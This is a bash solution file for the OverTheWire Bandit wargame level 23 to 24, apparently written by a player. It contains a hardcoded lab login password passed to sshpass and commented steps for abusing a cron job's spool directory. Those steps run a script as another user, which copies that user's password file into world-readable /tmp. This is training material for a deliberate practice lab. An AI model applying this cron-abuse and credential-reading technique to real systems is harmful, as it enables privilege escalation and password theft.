#!/bin/bash

sshpass -f <(printf '%s\n' QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G) ssh bandit23@bandit.labs.overthewire.org -p 2220

# Solution: 	
#
#	cat /etc/cron.d/cronjob_bandit24
#	cat /usr/bin/cronjob_bandit24.sh
#	mkdir /tmp/workspace
#	cd /tmp/workspace
#	vim getpass.sh
#	---------------------------------------------------
#	#!/bin/bash
#
#	cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
#	chmod 777 /tmp/bandit24_pass
#	---------------------------------------------------
#	chmod +x getpass.sh
#	cp getpass.sh /var/spool/bandit24/foo
#	cat /tmp/bandit24_pass
#
